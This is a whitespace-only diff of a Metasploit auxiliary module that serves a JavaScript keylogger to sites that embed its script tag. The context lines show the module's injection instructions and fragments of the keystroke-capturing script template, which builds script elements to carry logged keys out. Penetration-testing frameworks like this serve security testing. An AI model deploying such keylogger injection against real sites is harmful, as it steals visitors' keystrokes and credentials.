@@ -19,7 +19,7 @@ class Metasploit3 < Msf::Auxiliary
 				logging through JavaScript. The DEMO option can be set to enable
 				a page that demonstrates this technique. Future improvements will
 				allow for a configurable template to be used with this module.
-				To use this module with an existing web page, simply add a 
+				To use this module with an existing web page, simply add a
 				script source tag pointing to the URL of this service ending
 				in the .js extension. For example, if URIPATH is set to "test",
 				the following URL will load this script into the calling site:
@@ -232,7 +232,7 @@ EOS
 	def generate_keylogger_js(base_url, cid)
 
 		targ = Rex::Text.rand_text_alpha(12)
-	
+
 		code = <<EOS
 
 var c#{@seed} = 0;
@@ -267,12 +267,12 @@ function d#{@seed}(e){
 
 function #{@seed}(k#{@seed}){
 	l#{@seed} = l#{@seed} + k#{@seed} + ",";
-		
+
 	var t#{@seed} = "#{targ}" + c#{@seed};
 	c#{@seed}++;
-	
+
 	var f#{@seed};
-	
+
 	if (document.all)
 		f#{@seed} = document.createElement("<script name='" + t#{@seed} + "' id='" + t#{@seed} + "'></script>");
 	else {
